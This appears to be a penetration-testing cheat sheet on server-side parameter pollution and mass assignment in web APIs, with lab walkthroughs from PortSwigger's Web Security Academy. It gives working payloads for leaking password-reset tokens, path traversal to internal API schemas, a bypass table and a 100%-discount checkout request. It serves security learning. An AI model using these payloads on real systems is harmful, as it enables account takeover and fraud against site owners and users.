# API testing — Server-side parameter pollution and mass assignment

**SSPP:** user input is embedded directly in a server-side HTTP request or URL path; injecting `%26` (URL-encoded `&`) or `%23` (`#`) lets you add or truncate server-side query parameters. **Mass assignment:** the server accepts undocumented JSON fields that appear in GET responses but not in POST request docs — adding them to a POST can trigger privileged operations (100% discount, admin flag).

## Quick reference
```
# SSPP — query string injection (discover valid field name)
username=administrator%26field=§x§%23      (Intruder; payload list: Server-side variable names)
# when field=email works:  username=administrator%26field=reset_token%23  -> returns token
# then: GET /forgot-password?reset_token=<TOKEN> -> reset admin password

# SSPP — REST path traversal
username=../../../../openapi.json%23       -> API schema leaks endpoint structure
username=administrator/field/passwordResetToken%23  -> token for current API version
username=../../v1/users/administrator/field/passwordResetToken%23  -> explicit version path

# Mass assignment
GET /api/checkout   -> {"chosen_discount":{"percentage":0},...}  (extra field!)
POST /api/checkout  {"chosen_discount":{"percentage":100},"chosen_products":[{"product_id":"1","quantity":1}]}
                    -> 100% discount applied -> order placed free
```

## Root cause
- **SSPP:** application builds an internal API request by concatenating user input into a URL or query string: `GET /internal/api?username=<input>&field=email`. Injecting `%26field=x%23` makes it: `...?username=admin&field=x#&field=email` — the `#` truncates the original `field` param, and the injected `field` is used instead.
- **Mass assignment:** server-side frameworks (Rails, Django, NestJS) auto-bind all JSON keys to model attributes; if a `discount` or `isAdmin` field exists on the model but isn't exposed in the API docs, it can still be written via a normal API request.

## Find it
**SSPP:**
1. Find any POST/GET where a username/query param is forwarded server-side.
2. Test: add URL-encoded `%26x=y` → if response changes to "Parameter not supported" or "Extra param" → SSPP confirmed.
3. Test: add `%23` → if "Field not specified" error → server has more params you can control.
4. Brute-force: `%26field=§x§%23` with Intruder + "Server-side variable names" wordlist → find valid field names by response change.
5. Look at JS files (`/static/js/forgotPassword.js`) for internal API endpoint clues (reset_token param name, path structure).

**Mass assignment:**
1. Compare GET and POST requests for the same endpoint.
2. Any JSON key in the GET response not present in the POST body is a candidate.
3. Add it with various values — "validation error" or "success" both confirm the field is processed.

## Technique
**SSPP (query string):**
1. POST /forgot-password → `username=administrator` → normal response.
2. `username=administrator%26x=y` → "Parameter is not supported" → SSPP.
3. `username=administrator%23` → "Field not specified" → server builds `?username=admin#&field=email`; the # cuts `field`.
4. `username=administrator%26field=x%23` → "Invalid field" → field param is real.
5. Intruder: `field=§x§%23` with Server-side variable names list → `email` and `username` return 200; `reset_token` returns token.
6. `username=administrator%26field=reset_token%23` → token in response.
7. `GET /forgot-password?reset_token=<token>` → change admin password → log in → delete carlos.

**SSPP (REST path):**
1. `username=administrator%23` → "Invalid route" → input is in a URL path, not query string.
2. `username=./administrator` → original response → confirms path traversal context.
3. `username=../administrator` → "Invalid route" → went one level up.
4. Incrementally: `../../../../%23` → "Not found" → exited API root.
5. `../../../../openapi.json%23` → API schema reveals `/api/internal/v1/users/{username}/field/{field}`.
6. `username=administrator/field/foo%23` → "Only email field is supported".
7. `username=administrator/field/passwordResetToken%23` → "parameter not supported" (wrong API version).
8. `username=../../v1/users/administrator/field/passwordResetToken%23` → token returned.
9. Use token → reset admin password → log in.

**Mass assignment:**
1. GET /api/checkout → response body includes `"chosen_discount":{"percentage":0}`.
2. POST /api/checkout → body only has chosen_products.
3. Add `"chosen_discount":{"percentage":100}` to POST body → order placed with 100% off.

## Payload arsenal
```
# SSPP query — discovery
username=administrator%26x=y
username=administrator%23
username=administrator%26field=§x§%23   (Intruder)

# SSPP query — exploit
username=administrator%26field=reset_token%23
GET /forgot-password?reset_token=<TOKEN>

# SSPP REST path — discovery
username=administrator%23          -> Invalid route (input in path)
username=../../../../openapi.json%23 -> API schema

# SSPP REST path — exploit
username=../../v1/users/administrator/field/passwordResetToken%23

# Mass assignment
POST /api/checkout
{"chosen_discount":{"percentage":100},"chosen_products":[{"product_id":"1","quantity":1}]}
```

## Bypasses
| Defense | Bypass |
|---|---|
| Field not in POST docs | Mass assignment: add field from GET response to POST body |
| Input used in query string | SSPP: %26 to add params, %23 to truncate rest |
| Input used in URL path | Path traversal: ../ + %23 to navigate and truncate |
| API version mismatch | Include version path in traversal: ../../v1/users/... |

## Exploitation walkthrough
**SSPP query:** `%26x=y` = "Parameter not supported" → `%23` = "Field not specified" → Intruder brute `field=` → `reset_token` returns token → reset admin password → delete carlos.

**SSPP REST:** `%23` = "Invalid route" (path context) → count `../` to exit API → openapi.json reveals struct → traverse to `passwordResetToken` field → token → reset admin → delete carlos.

**Mass assignment:** GET /api/checkout → `chosen_discount` field visible → POST with `percentage:100` → free jacket.

## Chaining
- SSPP reset_token → admin account takeover → [Access-control](../../Access-control/).
- Mass assignment (100% discount) = [Business-logic-vulnerabilities](../../Business-logic-vulnerabilities/) outcome via API.
- API schema exposure → find internal endpoints → further SSRF / [SSRF](../../SSRF/).

## Tools
- **Burp Repeater** — test each pollution payload manually
- **Burp Intruder** — brute valid field names (Server-side variable names wordlist)
- **Burp Proxy JS file review** — /static/js/*.js reveals token param names and API paths

## Labs

### Exploiting server-side parameter pollution in a query string [Practitioner]
`username=administrator%26field=reset_token%23` → server internal query includes `field=reset_token` → token returned in response → reset admin password → delete carlos. Key insight: `%26` + `%23` injection controls what the internal API returns.

### Exploiting a mass assignment vulnerability [Practitioner]
GET /api/checkout exposes `chosen_discount.percentage` field. POST /api/checkout with `{"chosen_discount":{"percentage":100},...}` → 100% off → free jacket. Key insight: GET response reveals hidden writable fields; server auto-binds all JSON keys.

### Exploiting server-side parameter pollution in a REST URL [Expert]
Path traversal in username param (input goes into URL path). `../../../../openapi.json%23` → API schema → `/api/internal/v1/users/{user}/field/{field}`. `../../v1/users/administrator/field/passwordResetToken%23` → token → admin takeover. Key insight: `%23` truncates path; `../` traverses API path; schema from openapi.json reveals endpoint structure.

## Real-world notes
- SSPP is under-tested because it requires understanding the internal API topology — but the payoffs are high (password reset token = full account takeover).
- Mass assignment is endemic in frameworks that auto-bind models: Laravel `$fillable`, Rails `permit`, NestJS `@Body()`. Always compare GET/POST response schemas.
- Test JS files for API endpoint structure before guessing path traversal depth.

## References
- https://portswigger.net/web-security/api-testing/server-side-parameter-pollution
